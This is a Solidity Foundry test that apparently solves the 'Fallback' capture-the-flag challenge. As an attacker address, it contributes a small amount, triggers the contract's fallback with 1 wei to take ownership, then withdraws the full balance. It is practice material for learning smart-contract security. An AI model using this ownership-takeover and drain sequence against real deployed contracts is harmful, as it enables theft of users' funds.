// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployFallbackScript} from "@script/1_DeployFallback.s.sol";
import {Fallback} from "@main/1_Fallback.sol";

contract FallbackTest is Test, DeployFallbackScript {

    address public deployer;
    address public attacker = address(11);

    function setUp() public {

        deployer = msg.sender;

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        DeployFallbackScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        fallbackChallenge.contribute{value: 0.0005 ether}();
        (bool success, ) = address(fallbackChallenge).call{value: 1 wei}("");
        fallbackChallenge.withdraw();

        assertEq(success, true);
        assertEq( fallbackChallenge.owner(), attacker);
        assertEq( address(fallbackChallenge).balance, 0);
       
        vm.stopPrank(  );
    }


}